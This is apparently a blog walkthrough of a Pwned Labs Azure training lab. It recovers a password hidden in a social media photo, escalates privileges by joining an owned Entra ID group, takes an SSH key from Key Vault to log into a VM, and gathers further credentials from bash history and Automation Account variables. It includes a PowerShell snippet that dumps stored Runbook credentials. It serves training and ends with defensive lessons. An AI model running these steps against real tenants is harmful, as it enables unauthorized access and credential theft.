---
title: "Unmask Privileged Access In Azure"
date: 2024-10-16T11:54:55+01:00
description: "After leveraging a password found in an image and gaining access to Azure as Matteus Lundgren, we escalated privileges by adding ourselves to the DEVICE-ADMINS group, granting us access to critical resources, including an SSH key for the VM AUTOMAT01."
tags: [Azure, Red Teaming, Entra-ID, Powershell, ROADrecon]
categories: [Cloud]
---


**Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.**


## **Overview**

As part of our pre-engagement reconnaissance several Mega Big Tech employee profiles on LinkedIn were reviewed. One of their new employees, Matteus Lundgren posted recently about his new role and office space. This caught the eye as there appeared to be a Post-It note on the wall that had later been obfuscated. You are tasked with gaining initial access and demonstrating impact by increasing privileges.

![](https://i.pinimg.com/originals/02/62/fd/0262fdab2584fec5301fea9314c66618.gif)


## **Initial Access and Privilege Escalation from Social Media Reconnaissance**


- First of all we start by downloading the image this user posted on their social media from [here](https://drive.google.com/file/d/1bMYfsRp5U7vpTWVyiHon09qouZ-HBpIr/view?usp=sharing)
- The image says "**`#newoffice Rate.....`**" with a redacted text using a Markup's pencil, which poses significant risk as shown in this [forum](https://security.stackexchange.com/questions/161436/is-it-possible-for-someone-to-see-under-the-blacked-out-part-of-this-image-se/198905#198905)
- However it is possible to use `GIMP`, An image manipulation program to retrieve the obscured text.
	- Under the **`Colors`** drop down menu select **`Brightness-Contract..`** and edit.



![](https://i.imgur.com/svbxXYF.png)


- We got the text `SUMMERDAZE1!` or maybe we can call it a password.
- The next thing we need is this user actual username, We know they go by the name "**`Matteus Lundgren`**" but how is it saved on the domain ?.
- For active directory On-Prem, I have found this [tool](https://github.com/initstring/linkedin2username) to be useful as it creates a possible username from a given username and company name.
- However it is possible to guess this one as **Mega Big Tech** uses the below format :
	- `<firstname>@megabigtech.com`
	- `first.last@megabigtech.com



- With this format we can go ahead and try to login with a PS Session


```powershell
az login 
```


- Which worked as shown in the below screenshot


![](https://i.imgur.com/LNHP3Sy.png)


- We can also confirm that we have successfully login with the below command 


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> az account show
{
  "environmentName": "AzureCloud",
  "homeTenantId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxxxx",
  "id": "ceff06cb-e29d-4486-a3ae-eaaec5689f94",
  "isDefault": true,
  "managedByTenants": [],
  "name": "Microsoft Azure Sponsorship",
  "state": "Enabled",
  "tenantDefaultDomain": "megabigtech.com",
  "tenantDisplayName": "Default Directory",
  "tenantId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxxxx",
  "user": {
    "name": "matteus@megabigtech.com",
    "type": "user"
  }
}
```


- To understand the standpoint we are in, we can go ahead and list all resources that our current user has access to.


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> az resource list

[
  {
    "changedTime": "2023-11-30T17:17:51.364990+00:00",
    "createdTime": "2023-11-30T17:07:03.686020+00:00",
    "extendedLocation": null,
    "id": "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Compute/virtualMachines/AUTOMAT01",
    "identity": null,
    "kind": null,
    "location": "eastus",
    "managedBy": null,
    "name": "AUTOMAT01",
    "plan": null,
    "properties": null,
    "provisioningState": "Succeeded",
    "resourceGroup": "mbt-rg-5",
    "sku": null,
    "tags": null,
    "type": "Microsoft.Compute/virtualMachines",
    "zones": [
      "1"
    ]
  }
]
```


> As show above we have access to a virtual machine named `AUTOMAT01` in the `mbt-rg-5` resource group.



- We can therefore take a step further to retrieve general information about this virtual machine


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> az vm show --resource-group mbt-rg-5 --name AUTOMAT01

{
  "additionalCapabilities": {
    "hibernationEnabled": false,
    "ultraSsdEnabled": null
  },
  "applicationProfile": null,
  "availabilitySet": null,
  "billingProfile": null,
  "capacityReservation": null,
  "diagnosticsProfile": null,
  "evictionPolicy": null,
  "extendedLocation": null,
  "extensionsTimeBudget": null,
  "hardwareProfile": {
    "vmSize": "Standard_B1ms",
    "vmSizeProperties": null
  },
  "host": null,
  "hostGroup": null,
  "id": "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Compute/virtualMachines/AUTOMAT01",
  "identity": null,
  "instanceView": null,
  "licenseType": null,
  "location": "eastus",
  "name": "AUTOMAT01",
  "networkProfile": {
    "networkApiVersion": null,
    "networkInterfaceConfigurations": null,
    "networkInterfaces": [
      {
        "deleteOption": "Detach",
        "id": "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1",
        "primary": null,
        "resourceGroup": "mbt-rg-5"
      }
    ]
  },
  "osProfile": {
    "adminPassword": null,
    "adminUsername": "automation",
    "allowExtensionOperations": true,
    "computerName": "AUTOMAT01",
    "customData": null,
    "linuxConfiguration": {
      "disablePasswordAuthentication": true,
      "enableVmAgentPlatformUpdates": false,
      "patchSettings": {
        "assessmentMode": "ImageDefault",
        "automaticByPlatformSettings": null,
        "patchMode": "ImageDefault"
      },
      "provisionVmAgent": true,
      "ssh": {
        "publicKeys": [
          {
            "keyData": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6mR2ZA1xLw4xONa+hQYoVGcmKMZtVU+WVQjREfDgHsDZSIjDrvXAPOQe9falxs3Wj14EjOzPyCtnq3teFrqUaUjiFohaZTdU5mKikVFhLyG8hHvTp1QEI9bBYOVSi2n3pUUKq16VgZwpPIWJscdRJcFiN03mhC1clZwu4T/p7lFFNlGW33SxNN7vaXA05lX2laF3UGTBjU5fzRJ4zzC1Nn5OEUwIyRKsGE6uy/rZxhr5qrjGpthL27KpssXKcg9tJgTBsMTwQWsBSLCjUjrJv1VCQKkGlY5UXRck24TdVSSYt7j/m6G702huC1DrDEtbjXSGWZ17MT1RRIqChsdUY2l3+g8TSPaHyrxkC4y6q8scUWVgrIcvUHqtAJhYmEyeRVtiJcKSerqKdwsyNuIUbflkc/l99n0Dr1cyj/LDRdxVzjSjWxKMRxPgWrZ/kQ9mC5PicXuLXlQTceiIlExT59UTaYFpHmpmnarE3yzCRdqHyMfdu3tmsTEp39vt+7i0= generated-by-azure",
            "path": "/home/automation/.ssh/authorized_keys"
          }
        ]
      }
    },
    "requireGuestProvisionSignal": true,
    "secrets": [],
    "windowsConfiguration": null
  },
  "plan": null,
  "platformFaultDomain": null,
  "priority": null,
  "provisioningState": "Succeeded",
  "proximityPlacementGroup": null,
  "resourceGroup": "mbt-rg-5",
  "resources": null,
  "scheduledEventsProfile": null,
  "securityProfile": null,
  "storageProfile": {
    "dataDisks": [],
    "diskControllerType": "SCSI",
    "imageReference": {
      "communityGalleryImageId": null,
      "exactVersion": "20.04.202310250",
      "id": null,
      "offer": "0001-com-ubuntu-server-focal",
      "publisher": "canonical",
      "sharedGalleryImageId": null,
      "sku": "20_04-lts-gen2",
      "version": "latest"
    },
    "osDisk": {
      "caching": "ReadWrite",
      "createOption": "FromImage",
      "deleteOption": "Delete",
      "diffDiskSettings": null,
      "diskSizeGb": 30,
      "encryptionSettings": null,
      "image": null,
      "managedDisk": {
        "diskEncryptionSet": null,
        "id": "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Compute/disks/AUTOMAT01_OsDisk_1_367da2b6d9384da8ada2c2d49e5aa494",
        "resourceGroup": "mbt-rg-5",
        "securityProfile": null,
        "storageAccountType": "Standard_LRS"
      },
      "name": "AUTOMAT01_OsDisk_1_367da2b6d9384da8ada2c2d49e5aa494",
      "osType": "Linux",
      "vhd": null,
      "writeAcceleratorEnabled": null
    }
  },
  "tags": null,
  "timeCreated": "2023-11-30T17:07:03.721328+00:00",
  "type": "Microsoft.Compute/virtualMachines",
  "userData": null,
  "virtualMachineScaleSet": null,
  "vmId": "fc3e4e78-01a7-4cf2-a79c-1b897b6c951e",
  "zones": [
    "1"
  ]
}
```



Here’s a breakdown of the vital information from the output of your above command:

- **VM Name:** `AUTOMAT01`
- **Resource Group:** `mbt-rg-5`
- **Location:** `eastus`
- **VM Size:** `Standard_B1ms` (Basic tier, 1 vCPU, 2 GiB RAM)
- **OS Disk Size:** 30 GB (Managed disk with `Standard_LRS` storage)
- **OS Type:** Linux (Ubuntu 20.04 LTS)
- **Admin Username:** `automation`
- **SSH Public Key:** An SSH public key has been deployed for the user `automation`, located at `/home/automation/.ssh/authorized_keys`.
- **VM State:** Provisioning state is `Succeeded` (VM creation was successful).
- **Disk Encryption:** No disk encryption settings enabled.
- **Zone:** The VM is located in availability zone `1`.
- **Network:**
    - The VM is associated with a network interface `/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1`.



- According to the lab, since we have a public key for SSH, it is worth noting down an IP address for this Virtual Machine, However we have the following error


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> az vm show -d -g mbt-rg-5 -n AUTOMAT01 --query publicIps -o tsv

(AuthorizationFailed) The client 'matteus@megabigtech.com' with object id '0dd32296-20f5-447c-b879-c57922db1ff0' does not have authorization to perform action 'Microsoft.Network/networkInterfaces/read' over scope '/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1' or the scope is invalid. If access was recently granted, please refresh your credentials.
Code: AuthorizationFailed
Message: The client 'matteus@megabigtech.com' with object id '0dd32296-20f5-447c-b879-c57922db1ff0' does not have authorization to perform action 'Microsoft.Network/networkInterfaces/read' over scope '/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1' or the scope is invalid. If access was recently granted, please refresh your credentials.
```

## **ROADrecon For Structured Enumeration**


To better get familiar with this environment we can use the `ROADrecon` tool from the _(**R**ogue **O**ffice 365 and **A**zure (active) **D**irectory tools)_ framework to interact better with Entra-ID


```bash
❯ pip install roadrecon
```


Then authenticate to the utility to acquire tokens for our owned user.


```bash
❯ roadrecon auth -u matteus@megabigtech.com -p SUMMERDAZE1!
Tokens were written to .roadtools_auth
```


Then execute the below command to collect all Azure information that the user has permission to see.

```bash
❯ roadrecon gather
Starting data gathering phase 1 of 2 (collecting objects)
Starting data gathering phase 2 of 2 (collecting properties and relationships)
ROADrecon gather executed in 107.38 seconds and issued 1843 HTTP requests.
```

Finally start the `ROADrecon` GUI web server with  so we can visually examine the Azure environment.


```bash
❯ roadrecon gui
 * Serving Flask app 'roadtools.roadrecon.server'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
```

![](https://i.imgur.com/YHBli9z.png)


If `Bloodhound`is available we can also transfer the collected data to the corresponding `Neo4j` instance.


```bash
❯ roadrecon plugin bloodhound --neodatabase localhost -du neo4j -dp neo4j1

Connecting to neo4j
Running queries
Done!
```


Navigating to the **Users** tab and searching for our present user `Matt...`, We can view the overview of this user. As shown below we have the `ObjectID` and `Role Memeberships` they have been assigned to.

![](https://i.imgur.com/R6j4fBu.png)


Checking the `Owned objects` tab we see that our current user is the owner of the `DEVICE-ADMINS` group! This group allows desktop support to access resources and could help us in our goal to move laterally and vertically within the environment.


![](https://i.imgur.com/MGjOwm9.png)


Clicking the `Raw` tab we see the `ObjectID` of the group is shown as `aff1bca2-0c41-44e9-8e2c-8d6ca50fec45` .


![](https://i.imgur.com/jGrQswq.png)


Return to the `Owned objects` tab and click on this group, we can see the group overview below.


![](https://i.imgur.com/XPF5yCb.png)


Currently there are no members, but we can add ourselves to this group using the PowerShell Az module, since we are the owner.


```powershell
Connect-AzAccount

Add-AzADGroupMember -TargetGroupObjectId aff1bca2-0c41-44e9-8e2c-8d6ca50fec45 -MemberObjectId 0dd32296-20f5-447c-b879-c57922db1ff0
```

After running this command we will need to refresh our session in order for any permissions associated with this group to take effect.


```powershell
Disconnect-AzAccount
az logout
Connect-AzAccount
az login
```


Then running the below command we can check out the updated Azure role assignments.

```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Get-AzRoleAssignment
```


![](https://i.imgur.com/trjOpTo.jpeg)


![](https://i.imgur.com/88JdVqL.jpeg)


The most important output as shown in the above screenshots are the :

- `Scope` : This shows which resources the user has permissions over.
- `DisplayName` : shows the user or group assigned the role. (Remember we already belong to the `DEVICE-ADMINS` so we have permissions this group has too)
- `RoleDefinitionName` : shows the specific role (and associated permissions) assigned.


***So in summary the ;***

**Matteus Lundgren** has been assigned the **Reader role**, limited to the virtual machine **AUTOMAT01** within the **mbt-rg-5** resource group, allowing him read-only access to that VM.

For the **DEVICE-ADMINS Group**:

- They have access to resources in **mbt-rg-5**, including:
    - **Key Vault (Devices-new)**: The group can manage sensitive data like passwords or encryption keys stored in this Key Vault.
    - **Network Interface and Public IP for AUTOMAT01**: The group can view network-related details for this VM.

This setup controls what resources each entity can interact with in a specific resource group.


## **Initial Access to the AUTOMAT01 VM**


We can go ahead and enumerate the Key Vault! and as shown below a secret resource named `AUTOMAT01` is discovered which is stored in ASCII format.

```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> az keyvault secret list --vault-name Devices-new

[
  {
    "attributes": {
      "created": "2023-12-01T22:26:11+00:00",
      "enabled": true,
      "expires": null,
      "notBefore": null,
      "recoverableDays": 90,
      "recoveryLevel": "Recoverable+Purgeable",
      "updated": "2023-12-01T22:26:11+00:00"
    },
    "contentType": null,
    "id": "https://devices-new.vault.azure.net/secrets/AUTOMAT01",
    "managed": null,
    "name": "AUTOMAT01",
    "tags": {
      "file-encoding": "ascii"
    }
  }
]

```


We can then use the `az keyvault secret show` command to read the secret in this resource and as shown below we have an SSH key.


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> az keyvault secret show --vault-name Devices-new --name AUTOMAT01

{
  "attributes": {
    "created": "2023-12-01T22:26:11+00:00",
    "enabled": true,
    "expires": null,
    "notBefore": null,
    "recoverableDays": 90,
    "recoveryLevel": "Recoverable+Purgeable",
    "updated": "2023-12-01T22:26:11+00:00"
  },
  "contentType": null,
  "id": "https://devices-new.vault.azure.net/secrets/AUTOMAT01/80776fe595c64551a061e38de06eedab",
  "kid": null,
  "managed": null,
  "name": "AUTOMAT01",
  "tags": {
    "file-encoding": "ascii"
  },
  "value": "-----BEGIN RSA PRIVATE KEY-----\nMIIG4gIBAAKCAYEAupkdmQNcS8OMTjWvoUGKFRnJijGbVVPllUI0RHw4B7A2UiIw\n671wDzkHvX2pcbN1o9eBIzsz8grZ6t7Xha6lGlI4haIWmU3VOZiopFRYS8hvIR70\n6dUBCPWwWDlUotp96VFCqtelYGcKTyFibHHUSXBYjdN5oQtXJWcLuE/6e5RRTZRl\nt90sTTe72lwNOZV9pWhd1BkwY1OX80SeM8wtTZ+ThFMCMkSrBhOrsv62cYa+aq4x--SNIP--\n-----END RSA PRIVATE KEY-----\n"
}
```


It is also possible to download this SSH secret key on our machine without removing the `\n` terminator.

```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> az keyvault secret download --vault-name Devices-new --name AUTOMAT01 --file AUTOMAT01.pem
```


Since we have permission over the virtual machine `AUTOMAT01` in the resource group `mbt-rg-5`, as shown when enumerating the role assignments in the below screenshot previously, we can go ahead and get the IP address of this VM. 


![](https://i.imgur.com/plDs7J7.png)


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> az vm show -d -g mbt-rg-5 -n AUTOMAT01 --query publicIps -o tsv

13.68.147.240
```


Then we can grant `rw` permissions to the SSH private key and connect via SSH. If you are wondering how we got the username then refer to the top of this write-up during the enumeration of the VM phase

```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> chmod 600 ./AUTOMAT01.pem

PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> ssh -i AUTOMAT01.pem automation@13.68.147.240

The authenticity of host '13.68.147.240 (13.68.147.240)' can't be established.
ED25519 key fingerprint is SHA256:6GhdVGDYwkrfNkqprJC3ybwWOrbNuHwE7OxvJVvpWFo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '13.68.147.240' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1052-azure x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct 16 09:09:14 UTC 2024

  System load:  0.0                Processes:             103
  Usage of /:   12.1% of 28.89GB   Users logged in:       0
  Memory usage: 18%                IPv4 address for eth0: 10.1.0.4
  Swap usage:   0%

--SNIP--


automation@AUTOMAT01:~$ whoami
automation
automation@AUTOMAT01:~$ hostnamectl
   Static hostname: AUTOMAT01
         Icon name: computer-vm
           Chassis: vm
        Machine ID: 5ce911bbc50f4dc7876fbed23e106dd8
           Boot ID: 4ed5ef75483e407999f463f8d4a7f9eb
    Virtualization: microsoft
  Operating System: Ubuntu 20.04.6 LTS
            Kernel: Linux 5.15.0-1052-azure
      Architecture: x86-64s
```


## **Post Exploitation**


It is worth doing some laying off the land enumeration, finding sensitive files/ hardcoded credentials; And as shown below we have another user credential in the  `.bash_history` file of the user `automation` home directory.



```
az login -u "serene@megabigtech.com" -p "xxxxxxxxxxx"
```


![](https://i.imgur.com/uaCm5r1.png)


## **Accessing Automation Account and Exporting Runbook in Azure**

We can therefore go ahead back to our powershell session and connect to the new Azure account we just got!


```
Disconnect-AzAccount
az logout
Connect-AzAccount
az login
```

Then Access to an **Automation Account** named `automation-dev` and a **Runbook** named `Schedule-VMStartStop` was enumerated using `Get-AzResource`. or the `az resource list` command as used previously.

![](https://i.imgur.com/sOUPJOC.png)


> **Azure Automation Accounts** enable task automation using PowerShell or Python scripts for managing enterprise resources and workloads, streamlining deployment, operations, and decommissioning processes.
> 
> **Runbooks** are scripts within Automation Accounts that automate tasks, ensuring consistent management of resources at scale and minimizing manual intervention.



We can use the `Get-AzAutomationAccount` cmdlet to retrieve key details about the Automation Account, confirming whether public access is enabled or not.


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Get-AzAutomationAccount -ResourceGroupName "mbt-rg-5" -Name "automation-dev"

SubscriptionId        : ceff06cb-e29d-4486-a3ae-eaaec5689f94
ResourceGroupName     : mbt-rg-5
AutomationAccountName : automation-dev
Location              : eastus
State                 : Ok
Plan                  : Basic
CreationTime          : 12/1/2023 2:21:55PM +01:00
LastModifiedTime      : 12/1/2023 2:21:55PM +01:00
LastModifiedBy        : 
Tags                  : {}
Identity              : 
Encryption            : Microsoft.Azure.Management.Automation.Models.EncryptionProperties
PublicNetworkAccess   : True

```


Since we have `PublicNetworkAccess` set to `True` we can export the Runbook with `Export-AzAutomationRunbook`.


```powershell
Export-AzAutomationRunbook -ResourceGroupName "mbt-rg-5" -AutomationAccountName "automation-dev" -Name Schedule-VMStartStop -Output .
```


![](https://i.imgur.com/mBhBM5z.png)


As shown below this file doesn't contain any hardcoded credentials or sensitive information that would be useful from an attacker scenario.


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> file Schedule-VMStartStop.ps1
Schedule-VMStartStop.ps1: ASCII text, with CRLF line terminators

PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> cat Schedule-VMStartStop.ps1
param
(
    [Parameter(Mandatory=$true)]
    [string] $Action # Should be either 'Start' or 'Stop'
)

# Authenticate with Azure
$Conn = Get-AutomationConnection -Name AzureRunAsConnection
Connect-AzAccount -ServicePrincipal -TenantId $Conn.TenantId -ApplicationId $Conn.ApplicationId -CertificateThumbprint $Conn.CertificateThumbprint

# Fetch VMs based on tags
$VMsToProcess = Get-AzVM | Where-Object { ($_.Tags["AutoStart"] -eq "True" -and $Action -eq "Start") -or ($_.Tags["AutoStop"] -eq "True" -and $Action -eq "Stop") }

foreach ($VM in $VMsToProcess)
{
    if ($Action -eq "Start")
    {
        # Start the VM
        Start-AzVM -Name $VM.Name -ResourceGroupName $VM.ResourceGroupName -ErrorAction Continue
    }
    elseif ($Action -eq "Stop")
    {
        # Stop the VM
        Stop-AzVM -Name $VM.Name -ResourceGroupName $VM.ResourceGroupName -Force -ErrorAction Continue
    }
    else
    {
        Write-Output "Invalid Action Specified"
    }
}

Write-Output "Processed all VMs for action: $Action"

```


## **Credential Security in Automation Accounts**


It's also important to check for credentials configured in the automation account because automation tasks often require authentication to interact with various resources. While the actual password is not directly accessible, the credentials are still available for use within Runbooks to perform tasks that require authentication, such as managing resources or executing scripts. This ensures that the automation can securely access necessary resources without manual intervention.


```powershell
Get-AzAutomationCredential -ResourceGroupName "mbt-rg-5" -AutomationAccountName "automation-dev" | Format-Table Name, CreationTime, Description
```


![](https://i.imgur.com/HsSrdry.png)


We can check if we have write access to the `automation-dev` automation account using the `Get-AzRoleAssignment` command.


![](https://i.imgur.com/4T2TtM6.png)


As shown above we only have the `Reader` role meaning we can't edit the Runbook, if we could, we would append the following PowerShell to the script and see the credentials in the job output. 

```powershell
$cred = Get-AutomationPSCredential -Name automate-default
$cred.GetNetworkCredential().UserName
$cred.GetNetworkCredential().Password

```


If you are still interested in knowing how to edit the Runbook regardless of the missing permissions then refer to my alternate blog, [Link Here](https://sec-fortress.github.io/posts/articles/posts/Edit%20a%20Runbook%20in%20Azure%20and%20append%20a%20PowerShell%20script%20to%20retrieve%20credentials.html).


## **Identifying Unencrypted Variables**


Azure Automation supports variable assets, which are globally accessible variables for Runbooks. Sensitive variables like keys and passwords should be encrypted for security. However, in this instance, it appears that a sensitive variable was stored unencrypted, posing a security risk. This oversight could potentially grant unauthorized access to critical information, highlighting the importance of proper security practices in automation accounts.


```powershell
Get-AzAutomationVariable -ResourceGroupName "mbt-rg-5" -AutomationAccountName "automation-dev" | fl Name, Value, Description
```


![](https://i.imgur.com/M5qOssF.png)


As shown above we have the flag value and a Global administrator credential, haha ᯓ★.


## **Summary X Defense**

Employees often unintentionally expose sensitive information on social media, which red teams can exploit for phishing and password creation. In one case, an employee believed they had redacted sensitive data using iOS Markup, but it was recoverable due to transparency issues. Additionally, we exploited an exposed password in the `.bash_history` file, highlighting the risks of passing passwords via command lines, which can be logged in history files and Windows event logs, however to authenticate without a browser, we used `az login --use-device-code` to force device code authentication for more security. Finally, we obtained global admin credentials due to insecure secret storage, emphasizing the importance of saving sensitive data as encrypted variables, which are not encrypted by default.


## **Resources**

- **Lab Link :** [https://pwnedlabs.io/labs/unmask-privileged-access-in-azure](https://pwnedlabs.io/labs/unmask-privileged-access-in-azure)
- [https://trustedsec.com/blog/hacking-your-cloud-tokens-edition-2-0](https://trustedsec.com/blog/hacking-your-cloud-tokens-edition-2-0)
- [https://medium.com/@mgbecken/roadtools-1e9dabc2c8e9](https://medium.com/@mgbecken/roadtools-1e9dabc2c8e9)
- [https://learn.microsoft.com/en-us/azure/automation/automation-security-overview](https://learn.microsoft.com/en-us/azure/automation/automation-security-overview)